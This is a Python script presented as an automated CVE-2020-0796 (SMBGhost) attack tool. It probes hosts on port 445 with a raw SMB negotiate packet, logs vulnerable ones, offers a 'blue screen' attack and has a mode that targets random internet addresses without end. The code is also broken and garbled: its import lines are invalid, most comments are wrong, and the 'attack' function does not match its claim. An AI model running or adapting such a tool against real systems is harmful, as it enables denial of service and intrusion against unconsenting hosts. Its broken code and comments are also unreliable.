#!/usr/bin/python3

#     _______    ________    ___   ____ ___   ____        ____  _________  _____    _____ __  _______  ________               __ 
#    / ____/ |  / / ____/   |__ \ / __ \__ \ / __ \      / __ \/__  / __ \/ ___/   / ___//  |/  / __ )/ ____/ /_  ____  _____/ /_
#   / /    | | / / __/________/ // / / /_/ // / / /_____/ / / /  / / /_/ / __ \    \__ \/ /|_/ / __  / / __/ __ \/ __ \/ ___/ __/
#  / /___  | |/ / /__/_____/ __// /_/ / __// /_/ /_____/ /_/ /  / /\__, / /_/ /   ___/ / /  / / /_/ / /_/ / / / / /_/ (__  ) /_  
#  \____/  |___/_____/    /____/\____/____/\____/      \____/  /_//____/\____/   /____/_/  /_/_____/\____/_/ /_/\____/____/\__/  
#                                                                                                                              
#
#
#
#  ______________________________________________________________________________ 
##|A remote code execution vulnerability exists in the                           | 
##|   way that the Microsoft Server Message Block 3.1.1 (SMBv3) protocol         |
##|   handles certain requests,                                                  |
##!     aka 'Windows SMBv3 Client/Server Remote Code Execution Vulnerability'.   |
##|                                                                              |
##|This is based on the SMBGhost vulnerability script change,                    |
##|       adding automated hacking.                                              |
##|                                                                              |
##| 2022-12-26 <My emal>testsendkfotesycike@gmail.com                            |
##|      Marry Christmas!                                                        |
##|                                     <rewritten by GeumBo>                    |
##|                                     <Created by Radu-Emanuel Chiscariu>      |
##|                                                                              |
## ------------------------------------------------------------------------------
##

import socket #socket module, send and receive data
from random import randint as rand #random module is used to generate a random number
from time import sleep #time module is used to generate a random number
import struct #dec0de binary data
import os #operation system module is used to get the operating system of the target machine
import sys #sys module is used to get the operating system of the target machine
from netaddr import IPNetwork #network address module is used to get the operating system of the target machine
from /smbprotocol.connection import Connection #smbprotocol module is used to get the operating system of the target machine
from /smbprotocol.session import Session #smbprotocol module is used to get the operating system of the target machine
import uuid #uuid module is used to get the operating system of the target machine
import re #re module is used to get the operating system of the target machine

def bule_screen(IP, username=None, password=None, port=445, encode=None, connectionTimeout=10):
    _SMB_CONNECTIONS = {}
    connection_key = "%s:%s" %(IP, port)
    connection = _SMB_CONNECTIONS.get(connection_key, None)
    if not connection:
        connection = Connection(uuid.uuid4(), IP, port)
        connection.connect(timeout=connectionTimeout)
        _SMB_CONNECTIONS[connection_key] = connection
    session = next((s for s in connection.session_table.values() if username is None or s.username == username), None)
    if not session:
        session = Session(connection, username=username, password=password, require_encryption=(encode is True))
        session.connect()
    elif encode is not None:
        if session.encrypt_data and not encode:
            print("[\033[33m-\033[0m]Cannot disable encryption on an already negotiated session.")
        elif not session.encrypt_data and encode:
            session.encrypt = True
    return session
def test_host(IP):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        status = sock.connect_ex((str(IP),445))
        if status == 0:
            print("[\033[31m-\033[0m]THE ATTACK MAY FALI, BUT THE HOST OF THE OTHER PARTY IS STIALL ALIVE")
        else:
            print("[\033[32minfo\033[0m]THE ATTACK WAS SUCCESSFUL, BUT THE OTHER PARTY DID NOT RESPOND")
def randomIP():
    return ("%d.%d.%d.%d"%(rand(0,255),rand(0,255),rand(0,255),rand(0,255)));
def mode():
    try:
        SMBL = ("""\033[32m
    |CVE-2020-0796 SMBGhost|
\033[0m""")
        if len(sys.argv) == 1:
            print(SMBL)
            a = input("[\033[34minfo\033[0m]WHETHER TO ACTIVATE AUTOMATIC MODE? (y/n/exit)#")
            if a == "exit":
                exit(0)
            if a == "n" or a == "N" or a == "NO" or a == "no":
                while 1:
                    ip = input("[\033[34minfo\033[0m]ENTER IP#")
                    if ip == "help" or ip == "HELP":
                        print("""
command:
        local -- scan localnetwork
        help -- help
        exit -- exit program
""")
                    if ip == "exit" or ip == "EXIT":
                        exit(0);
                    else:
                        main(ip)
                    if ip == "local" or ip == "LOCAL":
                        for local in IPNetwork(socket.gethostbyname(socket.gethostname())+"/24"):
                            main(str(local))
                    else:
                        main(ip)
            elif a == "y" or a == "Y" or a == "yes" or a == "YES":
                while 1:
                    main(randomIP())
                    sleep(1)
                    continue
            else:
                print("[\033[31m-\033[0m]INPUT ERROR,PLEASE CHECK THE INPUT")
        else:
            argv_IP = sys.argv[1]
            print(SMBL)
            if argv_IP == "local" or argv_IP == "LOCAL":
                for IP_ in IPNetwork(socket.gethostbyname(socket.gethostname())+"/24"):
                    main(str(IP_))
            elif argv_IP == "help" or argv_IP == "HELP":
                print(r"""
command:
        local -- scan localnetwork
        help -- help
        ip address -- Scan the specified IP
""")
            elif argv_IP == "exit" or argv_IP == "EXIT":
                exit(0)
            else:
                main(argv_IP)
    except KeyboardInterrupt:
        print("[\033[31m-\033[0m]byebye")
def main(IP):
    try:
        port=445 #default port
        with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as sock: #create socket,AF_INET is IPv4,SOCK_STREAM is TCP
            sock.settimeout(5)
            scan = sock.connect_ex((IP,port)) #testing port status
            if scan == 0: #if port is open or filtered,then print the IP
                print("[\033[32minfo\033[0m]IP %s --- PORT 445 OPEN/FILTRTED"% IP)
                with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as smb:
                    smb.settimeout(30)
                    try:
                        smb.connect((IP, port)) #connect to the target
                    except: #if connect failed,then print the IP
                        smb.close()
                    smb.send(b'\x00\x00\x00\xc0\xfeSMB@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$\x00\x08\x00\x01\x00\x00\x00\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00x\x00\x00\x00\x02\x00\x00\x00\x02\x02\x10\x02"\x02$\x02\x00\x03\x02\x03\x10\x03\x11\x03\x00\x00\x00\x00\x01\x00&\x00\x00\x00\x00\x00\x01\x00 \x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\n\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00') #send vulnerable SMB payload
                    b, = struct.unpack(">I", smb.recv(4)) #decode binary data 
                    recv = smb.recv(b) #receive data
                    exploitCheck = (b"\x11\x03\x02\x00")
                    if recv[68:72] != exploitCheck: #if the data is not vulnerable,then print the IP
                        print("[\033[31m-\033[0m]IP %s Not Vulnerable"% IP) #if receive data is not vulnerable,then print the IP
                    elif recv[68:72] == exploitCheck: 
                        print("[\033[32minfo\033[0mIP %s Vulnerable"% IP) #if the data is vulnerable,then print the IP
                        exp=input("[\033[33minfo\033[0m]bule screen attack(Y/n)#")
                        if exp == "Y" or exp == "y":
                            bule_screen(IP, username="fakeuser", password="fakepass", encode=False);test_host(IP)
                        elif exp == "N" or exp == "n":
                            pass
                        with open(os.getcwd()+"/cve_2020_0796-host.txt",mode="a") as f: #write the IP to the file
                            for i in "%s"%(IP): #write the IP to the file
                                f.write(i) #write the IP to the file
                            f.close()
            else: #if port is not open or filtered,then print the IP
                print("[\033[31m-\033[0m]IP %s PARTY DID NOT OPEN PORT 445"% IP) #if port is not open,then print the IP
    except KeyboardInterrupt: #if user interrupt,print error
        print("[\033[33m-\033[0m]byebye!")
        exit(1) #exit
    except ConnectionResetError: #if connection reset,print error
        print("[\033[33m-\033[0m]PLEASE CHECK IF THE INTERNET PROTOCOL YOU ENTERED IS CORRECT")
    except socket.gaierror:
        print("[\033[33m-\033[0m]PLEASE CHECK IF THE INTERNET PROTOCOL YOU ENTERED IS CORRECT")
    except socket.timeout:
        print("[\033[33m-\033[0m]CONNECTION THE SERVER TIMEOUT")

if __name__ == "__main__":
    mode()
